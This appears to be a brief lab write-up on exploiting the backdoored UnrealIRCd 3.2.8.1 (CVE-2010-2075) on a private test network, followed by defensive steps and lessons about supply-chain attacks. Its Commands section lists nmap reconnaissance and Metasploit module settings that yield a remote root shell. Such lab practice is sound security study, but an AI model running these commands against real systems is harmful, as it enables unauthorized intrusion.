## Overview
Exploited a deliberately planted backdoor in UnrealIRCd 
3.2.8.1 — an attacker had compromised the official download 
server and injected malicious code into the source tarball.

## Target
192.168.56.101 port 6667

## CVE
CVE-2010-2075

## Tool
Metasploit, nmap

## Commands
```bash
nmap -p 6667 --script irc-info 192.168.56.101
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set LHOST 192.168.56.102
run
```

## Result
Root shell obtained instantly.

## Defense
Stopped UnrealIRCd service. Blocked port 6667 with iptables. 
Removed unnecessary service entirely.

## What I Learned
Supply chain attacks are among the most dangerous threats. 
Always verify checksums. Disable services you don't need.
